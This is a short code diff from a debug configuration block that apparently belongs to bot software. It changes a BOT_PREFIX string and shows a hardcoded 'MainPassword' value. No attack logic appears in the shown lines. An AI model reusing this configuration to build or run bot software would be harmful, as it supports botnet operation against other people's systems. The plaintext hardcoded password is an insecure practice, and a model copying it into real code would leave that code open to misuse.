@@ -95,7 +95,7 @@ namespace CONFIGDEBUGSTRINGS
 	PCHAR MainPassword    = "bRS8yYQ0APq9xfzC";
 
 
-	char BOT_PREFIX[]     = "videorectest";
+	char BOT_PREFIX[]     = "bsssigntesr";
 	PCHAR DebugDelay      = "1";
 
 #endif
